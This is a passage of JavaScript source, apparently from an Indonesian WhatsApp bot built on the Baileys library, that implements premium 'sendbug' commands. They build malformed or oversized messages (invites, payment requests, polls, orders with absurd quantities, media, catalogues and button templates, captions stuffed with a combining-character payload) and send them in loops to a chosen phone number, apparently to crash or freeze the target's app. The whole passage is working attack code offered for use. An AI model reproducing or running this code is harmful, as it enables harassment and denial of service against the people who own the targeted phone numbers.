var document = generateWAMessageFromContent(from,proto.Message.fromObject({documentMessage: {url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',mimetype: 'application/octet-stream',title: '.dev',fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',pageCount: 0,mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',fileName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',mediaKeyTimestamp: '1657288637',},}),{ userJid: from, quoted: bugkontak })
var sticker = generateWAMessageFromContent(from,proto.Message.fromObject({stickerMessage: {url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',mimetype: 'image/webp',height: 64,width: 64,directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',fileLength: '7774',mediaKeyTimestamp: '1657290167',isAnimated: false,},}),{ userJid: from, quoted: bugkontak })
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: bugkontak })
Araa.relayMessage(Input, buginvite.message, { messageId: buginvite.key.id })
Araa.relayMessage(Input, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
Araa.relayMessage(Input, pollCreation.message, { messageId: pollCreation.key.id })
Araa.relayMessage(Input, order.message, { messageId: order.key.id })
Araa.relayMessage(Input, audio.message, { messageId: audio.key.id })
Araa.relayMessage(Input, image.message, { messageId: image.key.id })
Araa.relayMessage(Input, document.message, { messageId: document.key.id })
Araa.relayMessage(Input, liveLocation.message, { messageId: liveLocation.key.id })
Araa.relayMessage(Input, sticker.message, { messageId: sticker.key.id })
Araa.sendKatalog(Input, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ofrply, { quoted: bugkontak })
Araa.sendMessage(Input, { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
setReply(`Berhasil mengirim Bug ke Nomer ${Input.split('@')[0]}`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break  
case 'sendbuginvitev':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
var buginvite = generateWAMessageFromContent(
from,
{
groupInviteMessage: {
groupJid: '6283144394823@g.us',
inviteCode: 'UkJdqTXupAtmDwo4',
inviteExpiration: '1643553084',
invitetime: '1643293887000',
groupName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
thumbnail: ofrply,
caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
contextInfo: { forwardingScore: 150, isForwarded: true },
},
},
{ quoted: bugkontak })
if (mentionByReply) {
await setReply('Sending...')
for (let i = 0; i < args[0]; i++) {
Araa.relayMessage(mentionByReply, buginvite.message, { messageId: buginvite.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByReply.split('@')[0]}`)
} else if (mentionByTag[0] && isGroup) {
await setReply('Sending...')
for (let i = 0; i < args[1]; i++) {
Araa.relayMessage(mentionByTag[0], buginvite.message, { messageId: buginvite.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByTag[0].split('@')[0]}`)
} else if (q.split('|')[0] && q.split('|')[1]) {
await setReply('Sending...')
for (let i = 0; i < q.split('|')[1]; i++) {
Araa.relayMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', buginvite.message, { messageId: buginvite.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '')}`)
}
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break  
case 'sendbugpaymentv':
case 'sendbugpayv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
if (mentionByReply) {
await setReply('Sending...')
for (let i = 0; i < args[0]; i++) {
Araa.relayMessage(mentionByReply, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByReply.split('@')[0]}`)
} else if (mentionByTag[0] && isGroup) {
await setReply('Sending...')
for (let i = 0; i < args[1]; i++) {
Araa.relayMessage(mentionByTag[0], { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByTag[0].split('@')[0]}`)
} else if (q.split('|')[0] && q.split('|')[1]) {
await setReply('Sending...')
for (let i = 0; i < q.split('|')[1]; i++) {
Araa.relayMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
}
setReply(`Berhasil mengirim Bug ke Nomer ${q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '')}`)
}
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break  
case 'sendbugpollingv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
var pollCreation = generateWAMessageFromContent(
from,
proto.Message.fromObject({
pollCreationMessage: {
name: 'HALO DEKK 🥶',
options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],
selectableOptionsCount: 5,
},
}),
{ userJid: from, quoted: bugkontak })
if (mentionByReply) {
await setReply('Sending...')
for (let i = 0; i < args[0]; i++) {
Araa.relayMessage(mentionByReply, pollCreation.message, { messageId: pollCreation.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByReply.split('@')[0]}`)
} else if (mentionByTag[0] && isGroup) {
await setReply('Sending...')
for (let i = 0; i < args[1]; i++) {
Araa.relayMessage(mentionByTag[0], pollCreation.message, { messageId: pollCreation.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByTag[0].split('@')[0]}`)
} else if (q.split('|')[0] && q.split('|')[1]) {
await setReply('Sending...')
for (let i = 0; i < q.split('|')[1]; i++) {
Araa.relayMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', pollCreation.message, { messageId: pollCreation.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '')}`)
}
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugtroliv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var order = generateWAMessageFromContent(
from,
proto.Message.fromObject({
orderMessage: {
orderId: '594071395007984',
orderImage: messa.imageMessage,
itemCount: 100000000000,
status: 'INQUIRY',
surface: 'CATALOG',
message: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
jpegThumbnail: ofrply,
orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
sellerJid: '628979185922@s.whatsapp.net',
token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',
totalAmount1000: '500000000000000',
totalCurrencyCode: 'IDR',
},
}),
{ userJid: from, quoted: bugkontak })
if (mentionByReply) {
await setReply('Sending...')
for (let i = 0; i < args[0]; i++) {
Araa.relayMessage(mentionByReply, order.message, { messageId: order.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByReply.split('@')[0]}`)
} else if (mentionByTag[0] && isGroup) {
await setReply('Sending...')
for (let i = 0; i < args[1]; i++) {
Araa.relayMessage(mentionByTag[0], order.message, { messageId: order.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByTag[0].split('@')[0]}`)
} else if (q.split('|')[0] && q.split('|')[1]) {
await setReply('Sending...')
for (let i = 0; i < q.split('|')[1]; i++) {
Araa.relayMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', order.message, { messageId: order.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '')}`)
}
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugaudiov':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
var audio = generateWAMessageFromContent(
from,
proto.Message.fromObject({
audioMessage: {
url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',
mimetype: 'audio/mpeg',
fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',
fileLength: '258330',
seconds: 16,
ptt: false,
mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',
fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',
directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',
mediaKeyTimestamp: '1657190832',
},
}),
{ userJid: from, quoted: bugkontak })
if (mentionByReply) {
await setReply('Sending...')
for (let i = 0; i < args[0]; i++) {
Araa.relayMessage(mentionByReply, audio.message, { messageId: audio.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByReply.split('@')[0]}`)
} else if (mentionByTag[0] && isGroup) {
await setReply('Sending...')
for (let i = 0; i < args[1]; i++) {
Araa.relayMessage(mentionByTag[0], audio.message, { messageId: audio.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByTag[0].split('@')[0]}`)
} else if (q.split('|')[0] && q.split('|')[1]) {
await setReply('Sending...')
for (let i = 0; i < q.split('|')[1]; i++) {
Araa.relayMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', audio.message, { messageId: audio.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '')}`)
}
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugimagev':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var image = generateWAMessageFromContent(
from,
proto.Message.fromObject({
imageMessage: {
url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',
mimetype: 'image/jpeg',
caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',
fileLength: '42521',
height: 426,
width: 640,
mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',
fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',
directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',
mediaKeyTimestamp: '1657286523',
jpegThumbnail: messa.imageMessage,
},
}),
{ userJid: from, quoted: bugkontak })
if (mentionByReply) {
await setReply('Sending...')
for (let i = 0; i < args[0]; i++) {
Araa.relayMessage(mentionByReply, image.message, { messageId: image.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByReply.split('@')[0]}`)
} else if (mentionByTag[0] && isGroup) {
await setReply('Sending...')
for (let i = 0; i < args[1]; i++) {
Araa.relayMessage(mentionByTag[0], image.message, { messageId: image.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByTag[0].split('@')[0]}`)
} else if (q.split('|')[0] && q.split('|')[1]) {
await setReply('Sending...')
for (let i = 0; i < q.split('|')[1]; i++) {
Araa.relayMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', image.message, { messageId: image.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '')}`)
}
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugdocumentv':
case 'sendbugdocv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
var document = generateWAMessageFromContent(
from,
proto.Message.fromObject({
documentMessage: {
url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',
mimetype: 'application/octet-stream',
title: '.dev',
fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',
pageCount: 0,
mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',
fileName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',
directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',
mediaKeyTimestamp: '1657288637',
},
}),
{ userJid: from, quoted: bugkontak })
if (mentionByReply) {
await setReply('Sending...')
for (let i = 0; i < args[0]; i++) {
Araa.relayMessage(mentionByReply, document.message, { messageId: document.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByReply.split('@')[0]}`)
} else if (mentionByTag[0] && isGroup) {
await setReply('Sending...')
for (let i = 0; i < args[1]; i++) {
Araa.relayMessage(mentionByTag[0], document.message, { messageId: document.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByTag[0].split('@')[0]}`)
} else if (q.split('|')[0] && q.split('|')[1]) {
await setReply('Sending...')
for (let i = 0; i < q.split('|')[1]; i++) {
Araa.relayMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', document.message, { messageId: document.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '')}`)
}
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugstickerv':
case 'sendbugstickv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
var sticker = generateWAMessageFromContent(
from,
proto.Message.fromObject({
stickerMessage: {
url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',
fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',
fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',
mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',
mimetype: 'image/webp',
height: 64,
width: 64,
directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',
fileLength: '7774',
mediaKeyTimestamp: '1657290167',
isAnimated: false,
},
}),
{ userJid: from, quoted: bugkontak })
if (mentionByReply) {
await setReply('Sending...')
for (let i = 0; i < args[0]; i++) {
Araa.relayMessage(mentionByReply, sticker.message, { messageId: sticker.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByReply.split('@')[0]}`)
} else if (mentionByTag[0] && isGroup) {
await setReply('Sending...')
for (let i = 0; i < args[1]; i++) {
Araa.relayMessage(mentionByTag[0], sticker.message, { messageId: sticker.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByTag[0].split('@')[0]}`)
} else if (q.split('|')[0] && q.split('|')[1]) {
await setReply('Sending...')
for (let i = 0; i < q.split('|')[1]; i++) {
Araa.relayMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', sticker.message, { messageId: sticker.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '')}`)
}
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbuglokasiv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var liveLocation = generateWAMessageFromContent(
from,
proto.Message.fromObject({ 
liveLocationMessage: { 
degreesLatitude: -6.9367014, 
degreesLongitude: 107.7228574, 
caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, 
sequenceNumber: '1657237469254001', 
jpegThumbnail: messa.imageMessage }
}),
{ userJid: from, quoted: bugkontak })
if (mentionByReply) {
await setReply('Sending...')
for (let i = 0; i < args[0]; i++) {
Araa.relayMessage(mentionByReply, liveLocation.message, { messageId: liveLocation.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByReply.split('@')[0]}`)
} else if (mentionByTag[0] && isGroup) {
await setReply('Sending...')
for (let i = 0; i < args[1]; i++) {
Araa.relayMessage(mentionByTag[0], liveLocation.message, { messageId: liveLocation.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByTag[0].split('@')[0]}`)
} else if (q.split('|')[0] && q.split('|')[1]) {
await setReply('Sending...')
for (let i = 0; i < q.split('|')[1]; i++) {
Araa.relayMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', liveLocation.message, { messageId: liveLocation.key.id })
}
setReply(`Berhasil mengirim Bug ke Nomer ${q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '')}`)
}
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugkatalogv':
case 'sendbugcatalogv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
if (mentionByReply) {
await setReply('Sending...')
for (let i = 0; i < args[0]; i++) {
Araa.sendKatalog(mentionByReply, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ofrply, { quoted: bugkontak })
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByReply.split('@')[0]}`)
} else if (mentionByTag[0] && isGroup) {
await setReply('Sending...')
for (let i = 0; i < args[1]; i++) {
Araa.sendKatalog(mentionByTag[0], `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ofrply, { quoted: bugkontak })
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByTag[0].split('@')[0]}`)
} else if (q.split('|')[0] && q.split('|')[1]) {
await setReply('Sending...')
for (let i = 0; i < q.split('|')[1]; i++) {
Araa.sendKatalog(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ofrply, { quoted: bugkontak })
}
setReply(`Berhasil mengirim Bug ke Nomer ${q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '')}`)
}
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugbuttonv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
if (mentionByReply) {
await setReply('Sending...')
for (let i = 0; i < args[0]; i++) {
Araa.sendMessage(mentionByReply, { 
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByReply.split('@')[0]}`)
} else if (mentionByTag[0] && isGroup) {
await setReply('Sending...')
for (let i = 0; i < args[1]; i++) {
Araa.sendMessage(mentionByTag[0], { 
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByTag[0].split('@')[0]}`)
} else if (q.split('|')[0] && q.split('|')[1]) {
await setReply('Sending...')
for (let i = 0; i < q.split('|')[1]; i++) {
Araa.sendMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', { 
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}
setReply(`Berhasil mengirim Bug ke Nomer ${q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '')}`)
}
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugspamv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!Input) return setReply('Masukan nomer target')
if (Input == Ownerin) return setReply('Tidak bisa, karena itu nomer developer')
var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6283144394823@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ofrply, caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: bugkontak })
var pollCreation = generateWAMessageFromContent(from,proto.Message.fromObject({pollCreationMessage: {name: 'HALO DEKK 🥶',options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],selectableOptionsCount: 5,},}),{ userJid: from, quoted: bugkontak })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: ofrply,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: bugkontak })
var audio = generateWAMessageFromContent(from,proto.Message.fromObject({audioMessage: {url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',mimetype: 'audio/mpeg',fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',fileLength: '258330',seconds: 16,ptt: false,mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',mediaKeyTimestamp: '1657190832',},}),{ userJid: from, quoted: bugkontak })
